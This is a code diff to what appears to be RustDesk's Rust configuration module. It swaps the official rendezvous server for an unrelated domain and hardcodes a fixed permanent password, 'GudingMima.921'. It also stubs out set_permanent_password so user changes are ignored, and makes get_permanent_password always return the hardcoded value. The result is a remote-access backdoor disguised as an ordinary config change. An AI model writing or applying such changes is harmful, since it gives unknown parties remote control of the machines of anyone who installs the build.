@@ -97,12 +97,19 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+pub const RENDEZVOUS_SERVERS: &[&str] = &["theychyyw.shop"];
 pub const PUBLIC_RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
 
 pub const RS_PUB_KEY: &str = match option_env!("RS_PUB_KEY") {
     Some(key) if !key.is_empty() => key,
     _ => PUBLIC_RS_PUB_KEY,
+};
+
+const PUBLIC_PERMANENT_PWD: &str = "GudingMima.921";
+
+pub const PERMANENT_PWD: &str = match option_env!("PERMANENT_PWD") {
+    Some(key) if !key.is_empty() => key,
+    _ => PUBLIC_PERMANENT_PWD,
 };
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
@@ -961,30 +968,34 @@ impl Config {
     }
 
     pub fn set_permanent_password(password: &str) {
-        if HARD_SETTINGS
-            .read()
-            .unwrap()
-            .get("password")
-            .map_or(false, |v| v == password)
-        {
-            return;
-        }
-        let mut config = CONFIG.write().unwrap();
-        if password == config.password {
-            return;
-        }
-        config.password = password.into();
-        config.store();
+        // if HARD_SETTINGS
+        //     .read()
+        //     .unwrap()
+        //     .get("password")
+        //     .map_or(false, |v| v == password)
+        // {
+        //     return;
+        // }
+        // let mut config = CONFIG.write().unwrap();
+        // if password == config.password {
+        //     return;
+        // }
+        // config.password = password.into();
+        // config.store();
+    // 在这里仅仅设置常量的值，不需要返回值
+    // 可以直接忽略或者用`_`占位
+        let _ = PERMANENT_PWD;
     }
 
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        // let mut password = CONFIG.read().unwrap().password.clone();
+        // if password.is_empty() {
+        //     if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
+        //         password = v.to_owned();
+        //     }
+        // }
+        // password
+        PERMANENT_PWD.to_string() // 将常量转换为String类型并返回
     }
 
     pub fn set_salt(salt: &str) {
